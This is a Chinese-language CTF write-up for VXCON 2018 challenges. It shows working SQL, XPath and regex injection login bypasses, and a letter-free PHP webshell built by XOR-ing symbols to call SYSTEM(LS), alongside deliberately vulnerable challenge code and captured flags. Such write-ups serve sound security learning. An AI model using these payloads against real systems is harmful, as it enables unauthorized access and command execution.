# vxcon2018
這次比賽個人覺得難度沒有很高(因為我至少有頭緒:joy:)，題目質量都能確保讓我們學到東西， 下面紀錄一些賽後解出來的題目...

## Lock Pick Duck (1)
[source code](https://github.com/shinmao/CTF-writeups/blob/master/vxcon2018/lpd_source.php)  
payload滿足三個條件就能拿到第一把flag  
```php
if(@preg_match("/^$U,$P$/m", $csvdb)){
        $flag++;
        echo "csvdb1\n";
    }

    if(@$sqldb->querySingle("SELECT username FROM users WHERE username='$U' AND password='$P'") == TRUE){
        $flag++;
        echo "sqldb1\n";
    }

    if(@$xmldb->xpath("//users/user[username='$U' and password='$P']") == TRUE){
        $flag++;
        echo "xmldb1\n";
    }
```
上面是通過的三個條件：  
2和3很簡單，sql injection 和 xpath injection 用
```php
?username='or''='&password='or''='
```
就可以通過  
第一個條件我就想了很久，注入正則想也知道洞很大，卻遲遲想不到怎麼注入  
賽後才知道，不如讓全部都匹配吧:+1:  
```php
?username=(.*)|' or ''='&password=(.*)|' or ''='
```
這樣就可以拿到第一把flag： `Flag 1: vxctf{y0u_d0_kn0w_InjectI0n_101}`  
除此之外，肯定還有很多繞過方法

## Lock Pick Duck (2)
繼上題一樣的source code，payload滿足六個條件就能拿到第二把flag  
第二題我目前最多只能構造到四個條件，xpath的條件都跟其他條件衝突  
不過也學到不少關於`preg_match`跟正則的關係  
payload: `http://trick.fflm.ml/?username=(a)|' union select 'a'--&password=a`  
必須重複刷新直到csv架構中出現**a**字元：`Flag 1: vxctf{y0u_d0_kn0w_InjectI0n_101}`  
[Payload詳解請見這](https://shinmao.github.io/web/2018/04/25/Lock-Pick-Duck/)  
![](https://github.com/shinmao/CTF-writeups/blob/master/vxcon2018/screenshot/LDP4conditions.png)


## Patch Peep Huck (w)
```php
 <?=
!$I=&$_FILES[!!$l='tmp_name'] || $I['size']>>7 || preg_match('/\w/',join(file($I[$l])))?
!show_source(__FILE__) : !include($I[$l]);
```
我在比賽時碰到了**讀不懂代碼**的問題:cold_sweat:  
賽後看了@kaibro的wp真的是讓我驚呆了呀  
首先是:
```php
$_FILES[!!$l='tmp_name']
```
這部分，我對`$_FILES`的結構還是有所了解的。`tmp_name`應該是要在第二層陣列之中，我在這裡卡了好久。原來問題出在`!!`，`!!`會將語句轉為boolean回傳true or false！  
這裏將`tmp_name`傳入參數的動作一定會回傳true，因此事實上這裏傳入`$I`的東東就是`$_FILES[1]`。  
解開了代碼的疑惑，再來看題目想幹嘛：  
上傳FILE，限制FILE的size，並且將FILE的內容join成字串做匹配  
典型的上傳webshell題，內容不能帶有字母，數字，底線  
(上傳檔案不一定要用burp代理，也可以自己寫個upload form，把action設給題目就好)  
一開始我卡在**底線的部分**很久，賽後看了@kaibro引用了在@l4w中的技巧 -> 表情符號  
終於自己寫出了個payload：  
```php
<?=
$😊 = "||||%-" ^ "/%/(``"; 
$😊 ("`|" ^ ",/");
```
剛開始解題的時候，我也有常識XOR的思路，根據P師傅的說法，我們可以用兩個特殊符號做XOR構造出a-z之間的字母，可是我卻怎麼湊都湊不出來...  
賽後才想到，乾脆來寫個php，把所以特殊符號之間的XOR都列出來，直接查表不就得了:  
```php
$arr1 = array("!","'","#","%","&","(",")","[","]","/","\\","?",".",",","^","_","~","*","+","-","<",">","=","{","}","\"",":",";","`","|");
$arr2 = array("!","'","#","%","&","(",")","[","]","/","\\","?",".",",","^","_","~","*","+","-","<",">","=","{","}","\"",":",";","`","|");

foreach ($arr1 as $value1) {
	foreach ($arr2 as $value2) {
		$x = $value1^$value2;
		print($x." ".$value1." ".$value2);
		echo "<br/>";
	}
	echo "<br/>";
}
```
於是通過上面的懶蟲法，我成功湊出了`<?=SYSTEM(LS);`的payload  

## Reference
1. [Kaibro WP](https://github.com/w181496/CTF/tree/master/vxcon2018)  
2. [官方詳解](https://github.com/ozetta/ctf-challenges)  
3. [一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
